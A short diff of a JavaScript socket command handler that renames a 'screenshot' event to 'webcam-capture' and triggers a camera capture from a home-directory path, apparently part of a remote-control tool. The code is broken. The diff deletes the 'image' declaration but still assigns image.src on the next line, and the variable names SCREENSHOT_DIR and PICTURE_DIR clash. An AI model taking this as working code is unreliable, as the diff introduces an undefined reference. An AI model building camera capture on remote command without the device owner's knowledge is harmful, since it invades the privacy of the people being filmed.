@@ -55,7 +55,7 @@ function handleCommand(socket) {
         client.on("UDP Client: error", function(err) {
             console.log("error: ",err);
         })
-        client.on("screenshot", function(){
+        client.on("webcam-capture", function(){
             const SCREENSHOT_DIR = path.join(require('os').homedir(), `webcam-capture`)
             fs.readFile(SCREENSHOT_DIR, (err) =>{
                 if(err){
@@ -69,7 +69,6 @@ function handleCommand(socket) {
                 ]
             );
             camera.on("close",()=>{
-                let image = new Image();
                 image.src = PICTURE_DIR;
             })
         })
